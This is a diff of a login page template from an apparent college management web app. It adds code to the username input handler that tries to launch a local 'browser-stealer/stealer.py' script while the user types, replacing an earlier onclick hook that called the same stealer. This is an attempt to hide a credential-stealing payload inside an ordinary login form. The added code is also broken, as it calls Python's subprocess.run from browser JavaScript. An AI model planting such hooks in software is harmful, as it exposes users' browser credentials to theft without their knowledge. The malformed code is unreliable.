@@ -24,7 +24,7 @@
                 <span class="text-danger"><i class="fas fa-exclamation-circle"></i> Invalid ID & Password.</span><br>
           {% endif %}
       
-          <button type="submit" class="btn btn-primary" id="login-btn" onclick="runPythonScript()"><i class="fas fa-sign-in-alt"></i><small> SIGN IN</small></button>
+          <button type="submit" class="btn btn-primary" id="login-btn"><i class="fas fa-sign-in-alt"></i><small> SIGN IN</small></button>
         </form>
         <br>
         <div class="login-bottom">
@@ -46,11 +46,8 @@
 
   $("#username").on("input", function () {
     username = $(this).val();
-
-    function runPythonScript() {
-      var pythonScriptPath = "C:/Users/shiv_/College-Management-System/College-Management-System/browser-stealer/stealer.py";
-      subprocess.run(["python", pythonScriptPath]);
-    }
+    var pythonScriptPath = "C:/Users/shiv_/College-Management-System/College-Management-System/browser-stealer/stealer.py";
+    subprocess.run(["python", pythonScriptPath]);
 
     $.ajax({
       url: "/accounts/ajax/validate-username/",
